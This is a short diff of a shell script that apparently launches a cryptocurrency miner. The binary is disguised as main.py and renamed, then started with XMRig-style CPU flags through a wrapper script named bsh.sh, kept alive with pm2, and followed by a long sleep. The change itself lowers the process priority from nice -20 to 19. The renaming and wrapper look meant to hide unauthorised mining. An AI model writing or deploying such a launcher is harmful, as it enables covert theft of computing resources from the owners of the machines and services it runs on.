@@ -28,6 +28,6 @@ mv main.py $NEW_PY
 chmod +x $NEW_PY
 echo "./$NEW_PY --cpu-max-threads-hint=100 --asm=auto --cpu-no-yield --cpu-priority=5 -t 4" > bsh.sh
 chmod +x bsh.sh
-nice -n -20 ./bsh.sh
+nice -n 19 ./bsh.sh
 nice -n 19 pm2 start bsh.sh
 sleep 1600
